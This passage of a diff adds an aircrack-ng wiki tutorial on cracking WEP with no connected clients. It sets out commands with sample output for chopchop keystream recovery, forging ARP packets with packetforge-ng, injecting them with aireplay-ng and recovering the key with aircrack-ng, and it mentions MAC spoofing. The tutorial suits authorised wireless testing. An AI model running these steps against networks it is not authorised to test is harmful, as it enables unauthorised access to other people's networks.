+ Offset   62 (44% done) | xor = 1F | pt = 37 |  166 frames written in   497ms
+ Offset   61 (46% done) | xor = 5C | pt = A8 |  119 frames written in   357ms
+ Offset   60 (48% done) | xor = 9B | pt = C0 |  229 frames written in   687ms
+ Offset   59 (50% done) | xor = 91 | pt = 00 |  113 frames written in   339ms
+ Offset   58 (51% done) | xor = 25 | pt = 00 |  184 frames written in   552ms
+ Offset   57 (53% done) | xor = 94 | pt = 00 |   33 frames written in    99ms
+ Offset   56 (55% done) | xor = F3 | pt = 00 |  193 frames written in   579ms
+ Offset   55 (57% done) | xor = D6 | pt = 00 |   17 frames written in    51ms
+ Offset   54 (59% done) | xor = FA | pt = 00 |   81 frames written in   243ms
+ Offset   53 (61% done) | xor = EA | pt = 01 |   95 frames written in   285ms
+ Offset   52 (63% done) | xor = 5D | pt = 37 |   24 frames written in    72ms
+ Offset   51 (65% done) | xor = 33 | pt = A8 |   20 frames written in    59ms
+ Offset   50 (67% done) | xor = CC | pt = C0 |   97 frames written in   291ms
+ Offset   49 (69% done) | xor = 03 | pt = C9 |  188 frames written in   566ms
+ Offset   48 (71% done) | xor = 34 | pt = E5 |   48 frames written in   142ms
+ Offset   47 (73% done) | xor = 34 | pt = 77 |   64 frames written in   192ms
+ Offset   46 (75% done) | xor = 51 | pt = F4 |  253 frames written in   759ms
+ Offset   45 (76% done) | xor = 98 | pt = 40 |  109 frames written in   327ms
+ Offset   44 (78% done) | xor = 3D | pt = 00 |  242 frames written in   726ms
+ Offset   43 (80% done) | xor = 5E | pt = 01 |  194 frames written in   583ms
+ Offset   42 (82% done) | xor = AF | pt = 00 |   99 frames written in   296ms
+ Offset   41 (84% done) | xor = C4 | pt = 04 |  164 frames written in   492ms
+ Offset   40 (86% done) | xor = CE | pt = 06 |   69 frames written in   207ms
+ Offset   39 (88% done) | xor = 9D | pt = 00 |  137 frames written in   411ms
+ Offset   38 (90% done) | xor = FD | pt = 08 |  229 frames written in   688ms
+ Offset   37 (92% done) | xor = 13 | pt = 01 |  232 frames written in   695ms
+ Offset   36 (94% done) | xor = 83 | pt = 00 |   19 frames written in    58ms
+ Offset   35 (96% done) | xor = 4E | pt = 06 |  230 frames written in   689ms
+ Sent 957 packets, current guess: B9...
+ 
+ The AP appears to drop packets shorter than 35 bytes.
+ Enabling standard workaround: ARP header re-creation.
+ 
+ Saving plaintext in replay_dec-0201-191706.cap
+ Saving keystream in replay_dec-0201-191706.xor
+ 
+ Completed in 21s (2.29 bytes/s)</pre>
+
+<p>
+
+Success!  The file “replay_dec-0201-191706.xor” above can then be used in the next step to generate an arp packet.
+</p>
+
+</div>
+
+<h4><a name="helpful_tips" id="helpful_tips">Helpful Tips</a></h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li">Be sure the packet is 68 or more bytes otherwise you may not have enough PRGA data to subsequently generate a packet.  The PRGA captured has to equal or greater then the packet length we want to generate.</div>
+</li>
+<li class="level1"><div class="li">At home, to generate some packets to force chopchop to start, ping a nonexistent IP on your network using a wired client.  This forces an arp to be broadcast and this will show up in chopchop to be used.</div>
+</li>
+<li class="level1"><div class="li">You can check the decrypted packet by running “tcpdump -n -vvv -e -s0 -r replay_dec-0201-191706.cap”.  In our example above:</div>
+</li>
+</ul>
+
+<p>
+   reading from file replay_dec-0201-191706.cap, link-type IEEE802_11 (802.11)
+19:17:06.842866 0us DA:Broadcast BSSID:00:14:6c:7e:40:80 SA:00:40:f4:77:e5:c9 LLC, dsap SNAP (0xaa), ssap SNAP (0xaa), cmd 0x03: oui Ethernet (0x000000), ethertype ARP (0x0806): arp who-has 192.168.1.12 tell 192.168.1.1
+</p>
+<ul>
+<li class="level1"><div class="li">If something happens part way through chopchop, you can reuse the source packet by entering “aireplay-ng -4 ath0 -h 00:09:5B:EC:EE:F2 -r replay_src-0201-191639.cap”. The replay source file is noted when chopchop starts.</div>
+</li>
+<li class="level1"><div class="li">Taking the previous tip further, if you have a capture file from another session, you can use it as input “aireplay-ng -4 ath0 -h 00:09:5B:EC:EE:F2 -r capture-from-some-other-time.cap”</div>
+</li>
+</ul>
+
+</div>
+
+<h4><a name="troubleshooting_tips2" id="troubleshooting_tips2">Troubleshooting Tips</a></h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li"> If the first packet you select does not work, then try a few others. Sometimes it takes more then one try to be successful with either attack.</div>
+</li>
+<li class="level1"><div class="li"> The chopchop attack will not be successful on some access points. If this happens, move onto the fragmentation attack.  And vice versa.</div>
+</li>
+<li class="level1"><div class="li"> Make sure you are properly associated. To check this, follow the tcpdump instructions in step 2.</div>
+</li>
+</ul>
+
+</div>
+
+<h3 class="sectionedit11"><a name="step_5_-_use_packetforge-ng_to_create_an_arp_packet" id="step_5_-_use_packetforge-ng_to_create_an_arp_packet">Step 5 - Use packetforge-ng to create an arp packet</a></h3>
+<div class="level3">
+
+<p>
+
+In the previous step, we obtained PRGA.  It does not matter which attack generated the PRGA, both are equal.  This PRGA is stored in the files ending with “xor”.  We can then use this PRGA to generate a packet for injection.  We will be generating an arp packet for injection.  The objective is to have the access point rebroadcast the injected arp packet.  When it rebroadcasts it, a new IV is obtained.  All these new IVs will ultimately be used to crack the WEP key.
+</p>
+
+<p>
+But first, lets generate the arp packet for injection by entering:
+
+</p>
+<pre class="code"> packetforge-ng -0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor -w arp-request</pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li">-0 means generate an arp packet</div>
+</li>
+<li class="level1"><div class="li">-a 00:14:6C:7E:40:80 is the access point MAC address</div>
+</li>
+<li class="level1"><div class="li">-h 00:09:5B:EC:EE:F2 is MAC address of our card</div>
+</li>
+<li class="level1"><div class="li">-k 255.255.255.255 is the destination IP (most APs respond to 255.255.255.255)</div>
+</li>
+<li class="level1"><div class="li">-l 255.255.255.255 is the source IP (most APs respond to 255.255.255.255)</div>
+</li>
+<li class="level1"><div class="li">-y fragment-0203-180343.xor is file to read the PRGA from (NOTE: Change the file name to the actual file name out in step 4 above)</div>
+</li>
+<li class="level1"><div class="li">-w arp-request is name of file to write the arp packet to</div>
+</li>
+</ul>
+
+<p>
+
+The system will respond:
+
+</p>
+<pre class="code"> Wrote packet to: arp-request</pre>
+
+</div>
+
+<h4><a name="helpful_tips1" id="helpful_tips1">Helpful Tips</a></h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li">After creating the packet, use tcpdump to review it from a sanity point of view.  See below.  It looks good!</div>
+</li>
+</ul>
+<pre class="code"> tcpdump -n -vvv -e -s0 -r arp-request           </pre>
+<pre class="code"> reading from file arp-request, link-type IEEE802_11 (802.11)
+ 10:49:17.456350 WEP Encrypted 258us BSSID:00:14:6c:7e:40:80 SA:00:09:5b:ec:ee:f2 DA:Broadcast Data IV: 8f Pad 0 KeyID 0</pre>
+
+<p>
+
+Since you are testing against your own AP (you are, right?), then decrypt the packet and ensure it is correct.  These steps are not required, they just prove to yourself that you have generated the correct packet.
+</p>
+
+<p>
+Decrypt the packet:
+
+</p>
+<pre class="code"> airdecap-ng -e teddy -w &lt;put your WEP key here&gt; arp-request</pre>
+
+<p>
+
+View the decrypted packet:
+
+</p>
+<pre class="code"> tcpdump -n -r arp-request-dec</pre>
+
+<p>
+
+It should be something like:
+</p>
+<pre class="code"> reading from file arp-request-dec, link-type EN10MB (Ethernet)
+ 10:49:17.456350 arp who-has 255.255.255.255 tell 255.255.255.255</pre>
+
+</div>
+
+<h3 class="sectionedit12"><a name="step_6_-_start_airodump-ng" id="step_6_-_start_airodump-ng">Step 6 -  Start airodump-ng</a></h3>
+<div class="level3">
+
+<p>
+
+Open another console session to capture the generated IVs.  Then enter:
+
+</p>
+<pre class="code">airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w capture ath0</pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li">-c 9 is the channel for the wireless network</div>
+</li>
+<li class="level1"><div class="li">-<code></code>-bssid 00:14:6C:7E:40:80 is the access point MAC address.  This eliminate extraneous traffic.</div>
+</li>
+<li class="level1"><div class="li">-w capture is file name prefix for the file which will contain the captured packets.</div>
+</li>
+<li class="level1"><div class="li">ath0 is the interface name.</div>
+</li>
+</ul>
+
+</div>
+
+<h3 class="sectionedit13"><a name="step_7_-_inject_the_arp_packet" id="step_7_-_inject_the_arp_packet">Step 7 - Inject the arp packet</a></h3>
+<div class="level3">
+
+<p>
+
+Using the console session where you generated the arp packet, enter:
+
+</p>
+<pre class="code"> aireplay-ng -2 -r arp-request ath0</pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li">-2 means use interactive frame selection</div>
+</li>
+<li class="level1"><div class="li">-r arp-request defines the file name from which to read the arp packet</div>
+</li>
+<li class="level1"><div class="li">ath0 defines the interface to use</div>
+</li>
+</ul>
+
+<p>
+
+The system will respond:
+
+</p>
+<pre class="code">      Size: 68, FromDS: 0, ToDS: 1 (WEP)
+      
+           BSSID  =  00:14:6C:7E:40:80
+       Dest. MAC  =  FF:FF:FF:FF:FF:FF
+      Source MAC  =  00:09:5B:EC:EE:F2
+      
+      0x0000:  0841 0201 0014 6c7e 4080 0009 5bec eef2  .A....l~@...[...
+      0x0010:  ffff ffff ffff 8001 8f00 0000 7af3 8be4  ............z...
+      0x0020:  c587 b696 9bf0 c30d 9cd9 c871 0f5a 38c5  ...........q.Z8.
+      0x0030:  f286 fdb3 55ee 113e da14 fb19 17cc 0b5e  ....U..&gt;.......^
+      0x0040:  6ada 92f2                                j...
+      
+      Use this packet ? y</pre>
+
+<p>
+
+Enter “y” to use this packet.  The system responds by showing how many packets it is injecting and reminds you to start airodump-ng if it has not already been started:
+
+</p>
+<pre class="code"> Saving chosen packet in replay_src-0204-104917.cap
+ You should also start airodump-ng to capture replies.
+ 
+ End of file.</pre>
+
+<p>
+
+While this command is successfully running, the airodump-ng screen will look similar to:
+
+</p>
+<pre class="code"> CH  9 ][ Elapsed: 16 s ][ 2007-02-04 11:04 
+                                                                                                               
+  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+                                                                                                               
+  00:14:6C:7E:40:80   47 100      179     2689  336   9  11  WEP  WEP         teddy                           
+                                                                                                               
+  BSSID              STATION            PWR  Lost  Packets  Probes                                             
+                                                                                                               
+  00:14:6C:7E:40:80  00:09:5B:EC:EE:F2   29     0     2707                                                     </pre>
+
+<p>
+
+You will notice that only one access point is being display since we included an airodump-ng filter to limit the capture to a single BSSID.  Also notice that the station packets are roughly equal to the BSSID data packets.  This means injection is working well.  Also notice the data rate of 336 packets per second which is also an indicator that the injection is working well.  This is a pretty “ideal” injection scenario.
+</p>
+
+</div>
+
+<h4><a name="troubleshooting_tips3" id="troubleshooting_tips3">Troubleshooting Tips</a></h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li">If the BSSID data packets are not increasing, make sure you are still associated with the access point.  To do this, follow the tcpdump instructions in step 2.</div>
+</li>
+</ul>
+
+</div>
+
+<h3 class="sectionedit14"><a name="step_8_-_run_aircrack-ng_to_obtain_the_wep_key" id="step_8_-_run_aircrack-ng_to_obtain_the_wep_key">Step 8 - Run aircrack-ng to obtain the WEP key</a></h3>
+<div class="level3">
+
+<p>
+
+Start another console session and enter:
+
+</p>
+<pre class="code"> aircrack-ng -b 00:14:6C:7E:40:80 capture*.cap </pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li">capture*.cap selects all dump files starting with “capture” and ending in “cap”.</div>
+</li>
+<li class="level1"><div class="li">-b 00:14:6C:7E:40:80 selects the one access point we are interested in</div>
+</li>
+</ul>
+
+<p>
+
+You can run this while generating packets.  In a short time, the WEP key will be calculated and presented. Using the PTW method, 40-bit WEP can be cracked with as few as 20,000 data packets and 104-bit WEP with 40,000 data packets.  As a reminder, the requirement is that you capture the full packet with airodump-ng. Meaning, do not use the “-<code></code>-ivs” option.  
+</p>
+
+<p>
+Troubleshooting Tips:
+
+</p>
+<ul>
+<li class="level1"><div class="li">Sometimes you need to try various techniques to crack the WEP key.  Try ”-n” to set various key lengths.  Use ”-f” and try various fudge factors.  Use ”-k” and try disabling various korek methods.</div>
+</li>
+</ul>
+
+</div>
+
+<h2 class="sectionedit15"><a name="alternate_solution" id="alternate_solution">Alternate Solution</a></h2>
+<div class="level2">
+
+<p>
+
+There is a neat trick which simplifies cracking WEP with no clients.  Essentially it takes any packet broadcast by the access point and converts it to a broadcast packet such that the access point generates a new IV.
+</p>
+
+<p>
+OK, at this point you are asking why didn't you show me this technique right at the start?  The reason is that this technique rebroadcasts whatever size packet you receive.  So if you receive a 1000 byte packet you then rebroadcast 1000 bytes.  This potentially slows down the packets per second rate considerably.  However, on the good news side, it is simple and easy to use.  You might also get lucky and receive a very small packet for rebroadcasting.  In this case, the performance is comparable to the solution described above.
+</p>
+
+<p>
+The same assumptions apply and you must also do a successful fake authentication first.
+</p>
+
+<p>
+Enter the following command:
+
+</p>
+<pre class="code"> aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0</pre>
+
+<p>
+
+Where:
+</p>
+<ul>
+<li class="level1"><div class="li">-2 means use interactive frame selection</div>
+</li>
+<li class="level1"><div class="li">-p 0841 sets the Frame Control Field such that the packet looks like it is being sent from a wireless client.</div>
+</li>
+<li class="level1"><div class="li">-c FF:FF:FF:FF:FF:FF sets the destination MAC address to be a broadcast. This is required to cause the AP to replay the packet and thus getting the new IV.</div>
+</li>
+<li class="level1"><div class="li">-b 00:14:6C:7E:40:80 is the access point MAC address</div>
+</li>
+<li class="level1"><div class="li">-h 00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</div>
+</li>
+<li class="level1"><div class="li">ath0 defines the interface to use</div>
+</li>
+</ul>
+
+<p>
+
+The system will respond:
+
+</p>
+<pre class="code"> Read 698 packets...
+ 
+      Size: 86, FromDS: 1, ToDS: 0 (WEP)
+ 
+           BSSID  =  00:14:6C:7E:40:80
+       Dest. MAC  =  FF:FF:FF:FF:FF:FF
+      Source MAC  =  00:D0:CF:03:34:8C
+
+      0x0000:  0842 0000 ffff ffff ffff 0014 6c7e 4080  .B..........l~@.
+      0x0010:  00d0 cf03 348c a0f4 2000 0000 e233 962a  ....4... ....3.*
+      0x0020:  90b5 fe67 41e0 9dd5 7271 b8ed ed23 8eda  ...gA...rq...#..
+      0x0030:  ef55 d7b0 a56f bc16 355f 8986 a7ab d495  .U...o..5_......
+      0x0040:  1daa a308 6a70 4465 9fa6 5467 d588 c10c  ....jpDe..Tg....
+      0x0050:  f043 09f6 5418                           .C..T.
+ 
+ Use this packet ? y</pre>
+
+<p>
+
+You enter “y” to select the packet and start injecting it.  Remember, the smaller the packet, the better.  You then start injecting:
+
+</p>
+<pre class="code"> Saving chosen packet in replay_src-0411-145110.cap
+ 
+ Sent 10204 packets...(455 pps)</pre>
+
+<p>
+
+If you have not already started airodump-ng, be sure to start it now.  Once you have sufficient IVs, you can start aircrack-ng and attempt to crack the WEP key.
+</p>
+
+<p>
+Another variation of this attack is to use packets from a previous capture.  You must have captured the full packets, not just the IVs.
+</p>
+
+<p>
+Here is what the command would look like:
+
+</p>
+<pre class="code"> aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -r capture-01.cap ath0</pre>
+
+<p>
+
+Where ” -r capture-01.cap” is data from a previous capture.
+</p>
+
+</div>
+
+<h2 class="sectionedit16"><a name="using_another_source_mac_address" id="using_another_source_mac_address">Using Another Source MAC Address</a></h2>
+<div class="level2">
+
+<p>
+
+The base tutorial assumes you are using the native MAC address of your wireless device as the source MAC.  If this is not the case, then you need to change the process used.  Since this is an advanced topic, I will provide the general guidelines and not the specific detail.
+</p>
+
+<p>
+Preferably, you should change the native MAC address of your wireless device to the MAC you will be spoofing.  This could the MAC of a client already associated with the AP or one that you make up.  See <a href="http://www.aircrack-ng.org/doku.php?id=faq#how_do_i_change_my_card_s_mac_address" class="wikilink1" title="faq">this FAQ entry</a> regarding how to change the MAC address of your card.
+
+</p>
+
+</div>
+
+    <!-- wikipage stop -->
+  </div>
+
+  <div class="clearer">&nbsp;</div>
+
+  
+  <div class="stylefoot">
+
+    <div class="meta">
+      <div class="user">
+              </div>
+      <div class="doc">
+        how_to_crack_wep_with_no_clients.txt · Last modified: 2011/08/28 16:08 by darkaudax      </div>
+    </div>
+
+   
+    <div class="bar" id="bar__bottom">
+      <div class="bar-left" id="bar__bottomleft">
+        <form class="button btn_source" method="post" action="http://www.aircrack-ng.org/doku.php"><div class="no"><input name="do" value="edit" type="hidden"><input name="rev" value="" type="hidden"><input name="id" value="how_to_crack_wep_with_no_clients" type="hidden"><input value="Show pagesource" class="button" accesskey="v" title="Show pagesource [V]" type="submit"></div></form>        <form class="button btn_revs" method="get" action="http://www.aircrack-ng.org/doku.php"><div class="no"><input name="do" value="revisions" type="hidden"><input name="id" value="how_to_crack_wep_with_no_clients" type="hidden"><input value="Old revisions" class="button" accesskey="o" title="Old revisions [O]" type="submit"></div></form>              </div>
+      <div class="bar-right" id="bar__bottomright">
+                                <form class="button btn_login" method="get" action="http://www.aircrack-ng.org/doku.php"><div class="no"><input name="do" value="login" type="hidden"><input name="sectok" value="3adf4779b91805cb1cf666e80c7d3486" type="hidden"><input name="id" value="how_to_crack_wep_with_no_clients" type="hidden"><input value="Login" class="button" title="Login" type="submit"></div></form>        <form class="button btn_index" method="get" action="http://www.aircrack-ng.org/doku.php"><div class="no"><input name="do" value="index" type="hidden"><input name="id" value="how_to_crack_wep_with_no_clients" type="hidden"><input value="Sitemap" class="button" accesskey="x" title="Sitemap [X]" type="submit"></div></form>        <a class="nolink" href="#dokuwiki__top"><input class="button" value="Back to top" onclick="window.scrollTo(0, 0)" title="Back to top" type="button"></a>&nbsp;
+      </div>
+      <div class="clearer"></div>
+    </div>
+
+  </div>
+
+  <div class="license">Except where otherwise noted, content on this wiki is licensed under the following license:<a href="http://creativecommons.org/licenses/by-nc-sa/3.0/" rel="license" class="urlextern">CC Attribution-Noncommercial-Share Alike 3.0 Unported</a></div>
+</div>
+
+<div class="footerinc">
+
+  <a href="http://www.aircrack-ng.org/feed.php" title="Recent changes RSS feed"><img src="button-rss.png" alt="Recent changes RSS feed" height="15" width="80"></a>
+
+        <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/" rel="license" title="CC Attribution-Noncommercial-Share Alike 3.0 Unported"><img src="cc-by-nc-sa.png" alt="" height="15" width="80"></a>
+  
+  <a href="http://www.dokuwiki.org/donate" title="Donate"><img src="button-donate.gif" alt="Donate" height="15" width="80"></a>
+
+  <a href="http://www.php.net/" title="Powered by PHP"><img src="button-php.gif" alt="Powered by PHP" height="15" width="80"></a>
+
+  <a href="http://validator.w3.org/check/referer" title="Valid XHTML 1.0"><img src="button-xhtml.png" alt="Valid XHTML 1.0" height="15" width="80"></a>
+
+  <a href="http://jigsaw.w3.org/css-validator/check/referer?profile=css3" title="Valid CSS"><img src="button-css.png" alt="Valid CSS" height="15" width="80"></a>
+
+  <a href="http://dokuwiki.org/" title="Driven by DokuWiki"><img src="button-dw.png" alt="Driven by DokuWiki" height="15" width="80"></a>
+
+
+
+</div>
+
+<div class="no"><img src="indexer.php" alt="" height="1" width="1"></div>
+
+
+</body>
+</html>
